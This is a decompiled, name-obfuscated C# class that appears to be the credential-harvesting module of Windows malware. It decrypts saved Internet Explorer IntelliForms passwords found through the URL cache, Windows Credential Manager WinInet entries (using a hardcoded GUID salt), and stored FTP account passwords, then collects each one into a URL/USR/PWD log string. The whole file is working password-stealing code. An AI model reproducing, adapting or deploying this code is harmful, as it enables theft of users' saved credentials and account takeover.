using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns5;

namespace ns0;

internal class Class11
{
	private struct Struct4
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public FILETIME filetime_0;

		public FILETIME filetime_1;

		public FILETIME filetime_2;

		public FILETIME filetime_3;

		public int int_8;

		public int int_9;

		public int int_10;

		public int int_11;
	}

	private struct Struct5
	{
		public int int_0;

		public int int_1;
	}

	private struct Struct6
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;
	}

	private struct Struct7
	{
		public int int_0;

		public FILETIME filetime_0;

		public int int_1;
	}

	private struct Struct8
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public FILETIME filetime_0;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public int int_8;

		public int int_9;

		public int int_10;
	}

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindFirstUrlCacheEntryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, IntPtr intptr_0, ref int int_0);

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindNextUrlCacheEntryA(int int_0, IntPtr intptr_0, ref int int_1);

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindCloseUrlCache(int int_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lstrlenA(IntPtr intptr_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegOpenKeyExA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, int int_2, ref int int_3);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, ref int int_2, IntPtr intptr_0, ref int int_3);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LocalFree(int int_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegCloseKey(int int_0);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData(ref Struct5 struct5_0, int int_0, ref Struct5 struct5_1, int int_1, int int_2, int int_3, ref Struct5 struct5_2);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW([MarshalAs(UnmanagedType.LPWStr)] string string_0, int int_0, ref int int_1, ref int int_2);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredFree(int int_0);

	private string method_0(IntPtr intptr_0)
	{
		return Marshal.PtrToStringAnsi(intptr_0);
	}

	private byte method_1(ref string string_0)
	{
		int num = 0;
		int num2 = Strings.Len(string_0);
		checked
		{
			for (int i = 1; i <= num2; i += 2)
			{
				num += (int)Math.Round(Conversion.Val("&H" + Strings.Mid(string_0, i, 2)));
			}
			return (byte)unchecked(num % 256);
		}
	}

	private string method_2(ref byte[] byte_0)
	{
		checked
		{
			byte_0 = (byte[])Utils.CopyArray((Array)byte_0, (Array)new byte[byte_0.Length + 1 + 1]);
			byte[] array = SHA1.Create().ComputeHash(byte_0);
			string text = "";
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text += Strings.Right("00" + Conversion.Hex(array[i]), 2);
			}
			return text;
		}
	}

	private void method_3(string string_0, string string_1, Struct5 struct5_0)
	{
		Struct7 @struct = default(Struct7);
		int num = Strings.Len((object)@struct);
		Struct6 struct2 = default(Struct6);
		Strings.Len((object)struct2);
		int int_ = struct5_0.int_1;
		IntPtr ptr = new IntPtr(struct5_0.int_1);
		checked
		{
			IntPtr ptr2 = new IntPtr(int_ + unchecked((int)Marshal.ReadByte(ptr)));
			object? obj = Marshal.PtrToStructure(ptr2, struct2.GetType());
			Struct6 struct3 = default(Struct6);
			struct2 = ((obj != null) ? ((Struct6)obj) : struct3);
			Struct7 struct4 = default(Struct7);
			if (struct2.int_4 == 1)
			{
				if (struct2.int_2 < 2)
				{
					return;
				}
				IntPtr intPtr = new IntPtr(ptr2.ToInt32() + struct2.int_1);
				IntPtr intPtr2 = new IntPtr(intPtr.ToInt32() + struct2.int_2 * num);
				int num2 = struct2.int_2 - 1;
				for (int i = 0; i <= num2; i += 2)
				{
					if ((intPtr2 == IntPtr.Zero) | (intPtr == IntPtr.Zero))
					{
						break;
					}
					object? obj2 = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj2 != null) ? ((Struct7)obj2) : struct4);
					IntPtr intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
					string text;
					if (lstrlenA(intptr_) != @struct.int_1)
					{
						ptr = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						text = Marshal.PtrToStringUni(ptr);
					}
					else
					{
						intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						text = Marshal.PtrToStringAnsi(intptr_);
					}
					intPtr = new IntPtr(intPtr.ToInt32() + num);
					object? obj3 = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj3 != null) ? ((Struct7)obj3) : struct4);
					string text2 = Strings.Space(@struct.int_1);
					intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
					if (lstrlenA(intptr_) != @struct.int_1)
					{
						ptr = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						text2 = Marshal.PtrToStringUni(ptr);
					}
					else
					{
						intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						text2 = Marshal.PtrToStringAnsi(intptr_);
					}
					intPtr = new IntPtr(intPtr.ToInt32() + num);
					Class13.string_0 = Class13.string_0 + "|URL| " + string_0 + "\r\n|USR| " + text + "\r\n|PWD| " + text2 + "\r\n";
				}
			}
			else
			{
				if (struct2.int_4 != 0)
				{
					return;
				}
				string text2 = null;
				IntPtr intPtr = new IntPtr(ptr2.ToInt32() + struct2.int_1);
				IntPtr intPtr2 = new IntPtr(intPtr.ToInt32() + struct2.int_2 * num);
				if ((intPtr2 == IntPtr.Zero) | (intPtr == IntPtr.Zero))
				{
					return;
				}
				int num3 = struct2.int_2 - 1;
				for (int j = 0; j <= num3; j++)
				{
					object? obj4 = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj4 != null) ? ((Struct7)obj4) : struct4);
					string text = Strings.Space(@struct.int_1);
					IntPtr intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
					if (lstrlenA(intptr_) != @struct.int_1)
					{
						ptr = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						text = Marshal.PtrToStringUni(ptr);
					}
					else
					{
						intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						text = Marshal.PtrToStringAnsi(intptr_);
					}
					intPtr = new IntPtr(intPtr.ToInt32() + num);
					Class13.string_0 = Class13.string_0 + "|URL| " + string_0 + "\r\n|USR| " + text + "\r\n|PWD| " + text2 + "\r\n";
				}
			}
		}
	}

	private void method_4(string string_0, int int_0)
	{
		string_0 = Strings.LCase(string_0);
		byte[] byte_ = Encoding.Unicode.GetBytes(string_0);
		string string_ = method_2(ref byte_);
		string_ += Strings.Right("00" + Conversion.Hex(method_1(ref string_)), 2);
		int int_ = default(int);
		int int_2 = default(int);
		RegQueryValueExA(int_0, ref string_, 0, ref int_, IntPtr.Zero, ref int_2);
		if (int_2 > 0)
		{
			IntPtr intptr_ = Marshal.AllocHGlobal(int_2);
			RegQueryValueExA(int_0, ref string_, 0, ref int_, intptr_, ref int_2);
			Struct5 struct5_ = default(Struct5);
			struct5_.int_0 = int_2;
			struct5_.int_1 = intptr_.ToInt32();
			Struct5 struct5_2 = default(Struct5);
			struct5_2.int_0 = checked(Strings.Len(string_0) * 2 + 2);
			struct5_2.int_1 = Marshal.StringToHGlobalUni(string_0).ToInt32();
			Struct5 struct5_3 = default(Struct5);
			CryptUnprotectData(ref struct5_, 0, ref struct5_2, 0, 0, 0, ref struct5_3);
			method_3(string_0, string_, struct5_3);
			IntPtr hglobal = new IntPtr(struct5_2.int_1);
			Marshal.FreeHGlobal(hglobal);
			LocalFree(struct5_3.int_1);
		}
	}

	protected string method_5(IntPtr intptr_0)
	{
		return Marshal.PtrToStringUni(intptr_0);
	}

	public void method_6()
	{
		checked
		{
			try
			{
				Regex regex = new Regex("name=\"([^\"]+)\"", RegexOptions.Compiled);
				string string_ = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage1";
				int int_ = default(int);
				RegOpenKeyExA(-2147483647, ref string_, 0, 131097, ref int_);
				string_ = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
				int int_2 = default(int);
				RegOpenKeyExA(-2147483647, ref string_, 0, 131097, ref int_2);
				if (int_2 != 0 || int_ != 0)
				{
					string_ = null;
					int int_3 = default(int);
					int num = FindFirstUrlCacheEntryA(ref string_, IntPtr.Zero, ref int_3);
					if (int_3 > 0)
					{
						IntPtr intPtr = Marshal.AllocHGlobal(int_3);
						Marshal.WriteInt32(intPtr, int_3);
						string_ = null;
						num = FindFirstUrlCacheEntryA(ref string_, intPtr, ref int_3);
						Struct4 @struct = default(Struct4);
						Struct4 struct2 = default(Struct4);
						IEnumerator enumerator = default(IEnumerator);
						do
						{
							object? obj = Marshal.PtrToStructure(intPtr, @struct.GetType());
							@struct = ((obj == null) ? struct2 : ((Struct4)obj));
							if ((unchecked((uint)@struct.int_3) & 0x200001u) != 0)
							{
								IntPtr intptr_ = new IntPtr(@struct.int_1);
								string text = method_0(intptr_);
								if (text.IndexOf("?") >= 0)
								{
									text = text.Substring(0, text.IndexOf("?"));
								}
								if (Strings.InStr(text, "@", (CompareMethod)0) > 0)
								{
									text = Strings.Mid(text, Strings.InStr(text, "@", (CompareMethod)0) + 1);
								}
								if (int_ != 0 && (@struct.int_3 & 1) == 1)
								{
									intptr_ = new IntPtr(@struct.int_8);
									string text2 = method_0(intptr_);
									if (!string.IsNullOrEmpty(text2) && text2.Contains("text/html"))
									{
										intptr_ = new IntPtr(@struct.int_2);
										string path = method_0(intptr_);
										try
										{
											try
											{
												enumerator = regex.Matches(File.ReadAllText(path)).GetEnumerator();
												while (enumerator.MoveNext())
												{
													Match match = (Match)enumerator.Current;
													method_4(match.Groups[1].Value, int_);
												}
											}
											finally
											{
												if (enumerator is IDisposable)
												{
													(enumerator as IDisposable).Dispose();
												}
											}
										}
										catch (Exception projectError)
										{
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
										}
									}
								}
								method_4(text, int_2);
							}
							int_3 = 0;
							FindNextUrlCacheEntryA(num, IntPtr.Zero, ref int_3);
							Marshal.FreeHGlobal(intPtr);
							if (int_3 > 0)
							{
								intPtr = Marshal.AllocHGlobal(int_3);
								Marshal.WriteInt32(intPtr, int_3);
							}
						}
						while (FindNextUrlCacheEntryA(num, intPtr, ref int_3) != 0);
						FindCloseUrlCache(num);
					}
					RegCloseKey(int_);
					RegCloseKey(int_2);
				}
				string string_2 = "Microsoft_WinInet_*";
				int int_4 = default(int);
				int int_5 = default(int);
				CredEnumerateW(string_2, 0, ref int_4, ref int_5);
				Struct5 struct5_ = default(Struct5);
				Struct5 struct5_2 = default(Struct5);
				Struct5 struct5_3 = default(Struct5);
				if (int_4 > 0)
				{
					int num2 = int_4 - 1;
					Struct8 struct3 = default(Struct8);
					Struct8 struct4 = default(Struct8);
					for (int i = 0; i <= num2; i++)
					{
						IntPtr intptr_ = new IntPtr(int_5 + i * 4);
						IntPtr intPtr = Marshal.ReadIntPtr(intptr_);
						object? obj2 = Marshal.PtrToStructure(intPtr, struct3.GetType());
						struct3 = ((obj2 != null) ? ((Struct8)obj2) : struct4);
						intptr_ = new IntPtr(struct3.int_2);
						string text3 = method_5(intptr_);
						struct5_.int_0 = 74;
						intPtr = Marshal.AllocHGlobal(74);
						string text4 = "abe2869f-9b47-4cd9-a358-c22904dba7f7\0";
						int num3 = 0;
						do
						{
							Marshal.WriteInt16(intPtr, num3 * 2, (short)(Strings.Asc(Strings.Mid(text4, num3 + 1, 1)) * 4));
							num3++;
						}
						while (num3 <= 36);
						struct5_.int_1 = intPtr.ToInt32();
						struct5_2.int_1 = struct3.int_5;
						struct5_2.int_0 = struct3.int_4;
						struct5_3.int_0 = 0;
						struct5_3.int_1 = 0;
						CryptUnprotectData(ref struct5_2, 0, ref struct5_, 0, 0, 0, ref struct5_3);
						Marshal.FreeHGlobal(intPtr);
						intptr_ = new IntPtr(struct5_3.int_1);
						string text5 = Marshal.PtrToStringUni(intptr_);
						string[] array = Strings.Split(text5, ":", -1, (CompareMethod)0);
						int num4 = Strings.InStr(Strings.Mid(text3, 19), "/", (CompareMethod)0);
						Class13.string_0 = Class13.string_0 + "|URL| " + Strings.Mid(text3, 19, num4 - 1) + "\r\n|USR| " + array[0] + "\r\n|PWD| " + array[1] + "\r\n";
						LocalFree(struct5_3.int_1);
					}
				}
				CredFree(int_5);
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\FTP\\Accounts");
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string text6 in subKeyNames)
				{
					RegistryKey registryKey2 = registryKey.OpenSubKey(text6);
					string[] subKeyNames2 = registryKey2.GetSubKeyNames();
					foreach (string text7 in subKeyNames2)
					{
						RegistryKey registryKey3 = registryKey2.OpenSubKey(text7);
						byte[] array2 = (byte[])registryKey3.GetValue("Password");
						byte[] array3 = new byte[4];
						int num5 = text6.Length - 1;
						for (int l = 0; l <= num5; l++)
						{
							byte b = (byte)(text6[l] & 0x1F);
							array3[l & 3] = (byte)unchecked((uint)(array3[l & 3] + b));
						}
						struct5_2.int_0 = array2.Length;
						struct5_2.int_1 = Marshal.AllocHGlobal(array2.Length).ToInt32();
						IntPtr intptr_ = new IntPtr(struct5_2.int_1);
						Marshal.Copy(array2, 0, intptr_, array2.Length);
						struct5_3.int_0 = 0;
						struct5_3.int_1 = 0;
						GCHandle gCHandle = GCHandle.Alloc(array3, GCHandleType.Pinned);
						struct5_.int_1 = gCHandle.AddrOfPinnedObject().ToInt32();
						struct5_.int_0 = 4;
						CryptUnprotectData(ref struct5_2, 0, ref struct5_, 0, 0, 0, ref struct5_3);
						gCHandle.Free();
						string[] array4 = new string[8]
						{
							Class13.string_0,
							"|URL| ",
							$"ftp://{text6}@{text7}/",
							"\r\n|USR| ",
							text7,
							"\r\n|PWD| ",
							null,
							null
						};
						string[] array5 = array4;
						intptr_ = new IntPtr(struct5_3.int_1);
						array5[6] = Marshal.PtrToStringUni(intptr_);
						array4[7] = "\r\n";
						Class13.string_0 = string.Concat(array4);
						LocalFree(struct5_3.int_1);
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
